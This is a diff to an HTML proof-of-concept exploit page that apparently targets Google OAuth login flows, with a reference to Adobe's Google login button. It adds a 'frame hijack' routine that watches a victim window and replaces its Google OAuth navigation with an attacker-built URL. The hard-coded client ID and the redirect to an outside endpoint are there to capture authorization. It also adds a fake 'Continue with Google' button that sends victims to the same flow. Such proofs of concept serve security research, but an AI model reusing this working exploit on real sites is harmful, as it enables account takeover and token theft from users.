@@ -19,7 +19,7 @@
         }
         button {
             padding: 10px 20px;
-            margin-top: 20px;
+            margin: 10px;
             background-color: #4caf50;
             color: white;
             border: none;
@@ -40,27 +40,12 @@
         }
     </style>
     <script>
-        // Helper: parse URL params
-        function getParameterByName(name, url) {
-            if (!url) url = window.location.href;
-            name = name.replace(/[\[\]]/g, "\\$&");
-            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-                results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, " "));
-        }
-
         // Logger
         function log(msg) {
             document.getElementById("log").innerHTML += msg + "<br>";
         }
 
-        let foo;
-        let urlParam;
-        let attackOAuthURL;
-
-        // Build attack OAuth URL dynamically
+        // Build malicious OAuth URL
         function buildAttackURL() {
             let client_id = "50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com";
             let redirect_uri = "https://poc-coop.com/store.html"; // change to your endpoint
@@ -73,6 +58,23 @@
                 "&scope=" + encodeURIComponent(scope);
         }
 
+        // Helper: parse URL params
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // ---------------------------
+        // 1. FRAME HIJACK ATTACK
+        // ---------------------------
+        let foo;
+        let attackOAuthURL;
+
         function monitorNavigation() {
             if (!foo || foo.closed) {
                 log("▶ Target window closed. Stopping monitor.");
@@ -83,23 +85,21 @@
                 let loc = foo.location.href;
                 log("Monitoring: " + loc);
 
-                // Detect Google OAuth navigation
                 if (loc.includes("accounts.google.com")) {
                     log("⚠ Detected Google OAuth flow, injecting malicious redirect...");
                     foo.location.replace(attackOAuthURL);
                     return;
                 }
             } catch (e) {
-                // Cross-origin block until same-origin or navigated
                 log("Cross-origin navigation detected, waiting...");
             }
 
             setTimeout(monitorNavigation, 800);
         }
 
-        function launch() {
+        function launchHijack() {
             attackOAuthURL = buildAttackURL();
-            urlParam = getParameterByName('url');
+            let urlParam = getParameterByName('url');
             if (!urlParam) {
                 log("❌ Missing ?url= parameter for victim flow.");
                 return;
@@ -107,14 +107,33 @@
 
             log("▶ Opening target: " + urlParam);
             foo = window.open(urlParam, "foo", "width=500,height=600,noopener,noreferrer");
+            setTimeout(monitorNavigation, 2000);
+        }
 
-            setTimeout(monitorNavigation, 2000); // start monitoring
+        // ---------------------------
+        // 2. BASEURL REPLACEMENT ATTACK
+        // ---------------------------
+        function launchBaseURL() {
+            let attackURL = buildAttackURL();
+            log("▶ Overriding Google button with malicious OAuth flow.");
+
+            // Simulate Adobe's Google login button replacement
+            let fakeBtn = document.createElement("button");
+            fakeBtn.innerText = "Continue with Google (Hijacked)";
+            fakeBtn.style.backgroundColor = "#db4437";
+            fakeBtn.onclick = function() {
+                log("⚠ Redirecting victim to malicious OAuth flow...");
+                window.location.href = attackURL;
+            };
+
+            document.body.appendChild(fakeBtn);
         }
     </script>
 </head>
 <body>
     <img src="https://media.tenor.com/HQEVMrJMMI0AAAAi/cat-cat-tutu.gif" alt="Funny cat">
-    <button onclick="launch()">Exploit</button>
+    <button onclick="launchHijack()">Exploit (Frame Hijack)</button>
+    <button onclick="launchBaseURL()">Exploit (BaseURL Replacement)</button>
     <div id="log"></div>
 </body>
 </html>
